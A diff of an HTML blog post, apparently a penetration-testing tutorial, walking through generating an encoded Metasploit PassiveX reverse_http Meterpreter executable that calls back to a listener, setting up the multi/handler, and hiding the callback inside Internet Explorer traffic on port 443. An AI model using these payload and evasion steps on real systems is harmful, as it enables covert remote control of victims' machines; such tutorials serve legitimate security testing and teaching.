@@ -20,13 +20,13 @@
 &lt;p&gt;A really down and dirty explination of what PassiveX is and why it&amp;rsquo;s useful in this sort of situation is that instead of making a direct connection back to you, it uses an iexplorer process with a cool ActiveX control to talk back. So someone looking for a rogue process will only see Internet Explorer open and talking over port 443 (as specified).&lt;/p&gt;
 &lt;p&gt;(props to skape for writting PassiveX and @&lt;a href=&#34;https://twitter.com/natronkeltner&#34;&gt;NatronKeltner&lt;/a&gt; for kicking in the latest tweaks to make it work with IE7/IE8)&lt;/p&gt;
 &lt;p&gt;Here are the options for msfpayload:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Usage: ./msfpayload &amp;lt;payload&amp;gt; [var=val] &amp;lt;S[ummary]|C|P[erl]|[Rub]y|R[aw]|J[avascript]|e[X]ecutable|[V]BA&amp;gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Usage: ./msfpayload &amp;lt;payload&amp;gt; [var=val] &amp;lt;S[ummary]|C|P[erl]|[Rub]y|R[aw]|J[avascript]|e[X]ecutable|[V]BA&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And msfencode&amp;rsquo;s options if you chose to use it as I demonstrate below. However, encoding happens by default with msfpayload (IIRC):&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;./msfencode -h
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./msfencode -h
 Usage: ./msfencode &amp;lt;options&amp;gt;
 OPTIONS:
 -a &amp;lt;opt&amp;gt; The architecture to encode as     
--b &amp;lt;opt&amp;gt; The list of characters to avoid: &#39;x00xff&#39;      
+-b &amp;lt;opt&amp;gt; The list of characters to avoid: &amp;#39;x00xff&amp;#39;      
 -c &amp;lt;opt&amp;gt; The number of times to encode the data      
 -e &amp;lt;opt&amp;gt; The encoder to use      
 -h Help banner      
@@ -38,10 +38,10 @@ OPTIONS:
 -s &amp;lt;opt&amp;gt; The maximum size of the encoded data      
 -t &amp;lt;opt&amp;gt; The format to display the encoded buffer with (c, elf, exe, java, perl, raw, ruby, vba)
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here we create the PassiveX payload. Note the PX options instead of the LHOST/LPORT:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;./msfpayload windows/reflectivemeterpreter/reverse_http PXHOST=192.168.1.100 PXPORT=443 PXURI=/ R | ./msfencode -t exe -o /tmp/maliciouspayload.exe
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./msfpayload windows/reflectivemeterpreter/reverse_http PXHOST=192.168.1.100 PXPORT=443 PXURI=/ R | ./msfencode -t exe -o /tmp/maliciouspayload.exe
 [*] x86/shikata_ga_nai succeeded with size 97 (iteration=1)
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now that we have our &amp;ldquo;malicious payload&amp;rdquo; in /tmp we get our listener ready (you can use msfcli as well, I just like msfconsole because it provides me more flexibility):&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;./msfconsole
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./msfconsole
 
  
 
@@ -64,8 +64,8 @@ _ _ _ _ _|_ __, , _ | | __ _|_
 
 msf &amp;gt; use multi/handler     
 msf exploit(handler) &amp;gt; exploit -h
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;(I&amp;rsquo;m showing you &amp;lsquo;exploit&amp;rsquo;s options because a lot of people don&amp;rsquo;t know they exist. With two lines you can start your listener (use, then exploit):**&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Usage: exploit [options]     
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;(I&amp;rsquo;m showing you &amp;rsquo;exploit&amp;rsquo;s options because a lot of people don&amp;rsquo;t know they exist. With two lines you can start your listener (use, then exploit):**&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Usage: exploit [options]     
 Launches an exploitation attempt.
 
 OPTIONS:     
